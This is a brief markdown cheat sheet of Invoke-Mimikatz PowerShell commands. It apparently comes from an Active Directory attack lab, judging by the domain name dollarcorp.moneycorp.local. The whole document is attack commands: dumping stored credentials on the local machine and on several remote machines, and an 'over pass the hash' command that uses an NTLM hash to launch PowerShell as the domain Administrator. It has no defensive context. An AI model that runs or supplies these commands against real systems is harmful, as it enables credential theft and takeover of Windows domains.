# Invoke-Mimikatz 

## Dump credentials on a local machine
```powershell
Invoke-Mimikatz -DumpCreds
```

## Dump credentials on multiple remote machines
```powershell
Invoke-Mimikatz -DumpCreds -ComputerName @("sys1","sys2")
```

## "Over pass the hash" generate tokens from hashes
```powershell
Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:dollarcorp.moneycorp.local /ntlm:<ntImhash> /run:powershell.exe"'
```